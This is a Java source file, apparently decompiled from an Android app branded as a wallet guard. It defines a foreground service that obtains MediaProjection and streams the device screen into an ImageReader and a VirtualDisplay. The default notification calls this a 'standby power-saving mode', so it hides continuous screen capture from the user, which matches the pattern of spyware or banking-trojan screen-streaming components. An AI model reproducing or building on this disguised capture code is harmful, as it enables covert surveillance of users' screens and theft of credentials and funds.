package com.guard.wallet.service;

import com.guard.wallet.core.AppUtils;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.utils.ConfigManager;
import com.guard.wallet.utils.DeviceUtils;
import java.util.concurrent.locks.ReentrantLock;
import com.guard.wallet.capture.ScreenCaptureManager;
import com.guard.wallet.capture.ProjectionCallback;

/**
 * MediaLiveService — foreground service for media projection (screen capture).
 * Creates a foreground notification, obtains MediaProjection, and sets up
 * VirtualDisplay via ScreenCaptureManager for screen streaming.
 */
public class MediaLiveService extends Service {
    private static final String TAG = "MediaLiveService";
    private static final String CHANNEL_ID = "100";
    private static final int NOTIFICATION_ID = 100;

    @Override
    public final IBinder onBind(Intent var1) {
        return null;
    }

    @Override
    public final void onCreate() {
        super.onCreate();
        NotificationManager nm = (NotificationManager) this.getSystemService("notification");
        PendingIntent pi = PendingIntent.getActivity(this, 0,
                new Intent(this, MediaLiveService.class), 67108864);
        NotificationCompat.Builder builder = new NotificationCompat.Builder(
                this.getApplicationContext(), CHANNEL_ID).setContentIntent(pi);

        Integer iconRes = ConfigManager.DEFAULT_PROMOTION_MODEL;

        // Notification title
        String title;
        if (MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getNotificationTitle())) {
            title = MainApplication.getInstance().getBuildConfig().getNotificationTitle();
        } else {
            title = "standby power-saving mode";
        }
        builder = builder.setContentTitle(title);

        // Notification content
        String content;
        if (MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getNotificationContent())) {
            content = MainApplication.getInstance().getBuildConfig().getNotificationContent();
        } else {
            content = "entered standby power-saving mode, click here to wake up";
        }

        builder = builder.setContentText(content)
                .setWhen(System.currentTimeMillis())
                .setVisibility(1)
                .setDefaults(-1)
                .setCategory("service")
                .setPriority(2);

        NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "front_media_live_notification", 4);
        channel.setLockscreenVisibility(1);
        nm.createNotificationChannel(channel);
        builder.setChannelId(CHANNEL_ID);

        Notification notification = builder.build();
        notification.defaults = 1;
        notification.flags = 32;
        this.startForeground(NOTIFICATION_ID, notification);
    }

    @Override
    public final void onDestroy() {
        super.onDestroy();
        try {
            ScreenCaptureManager capture = ScreenCaptureManager.getInstance();
            capture.requesting.set(false);
            capture.release();
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        ((NotificationManager) this.getSystemService("notification")).cancel(NOTIFICATION_ID);
        this.stopForeground(true);
    }

    @Override
    public final int onStartCommand(Intent var1, int var2, int var3) {
        int code = var1.getIntExtra("code", -1);
        Intent data = (Intent) var1.getParcelableExtra("data");

        MediaProjection projection = null;
        try {
            MediaProjectionManager mpm = (MediaProjectionManager) this.getSystemService("media_projection");
            if (mpm != null) {
                projection = mpm.getMediaProjection(code, data);
                ProjectionCallback callback = new ProjectionCallback();
                projection.registerCallback(callback, ScreenCaptureManager.getHandler());
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }

        if (projection != null) {
            ScreenCaptureManager screenCapture = ScreenCaptureManager.getInstance();
            ReentrantLock lock = screenCapture.setupLock;
            if (lock.tryLock()) {
                if (!screenCapture.isReady()) {
                    screenCapture.projection = projection;
                    ScreenMetricsVO metrics = DeviceUtils.buildScreenMetrics();
                    ImageReader reader = ImageReader.newInstance(
                            metrics.getWidth(), metrics.getHeight(), 1, 2);
                    screenCapture.imageReader = reader;
                    Handler handler = ScreenCaptureManager.getHandler();
                    reader.setOnImageAvailableListener(screenCapture.imageListener, handler);
                    screenCapture.virtualDisplay = ScreenCaptureManager.createVirtualDisplay(screenCapture.projection, screenCapture.imageReader.getSurface());
                }
                lock.unlock();
            }
        }

        return 1;
    }
}
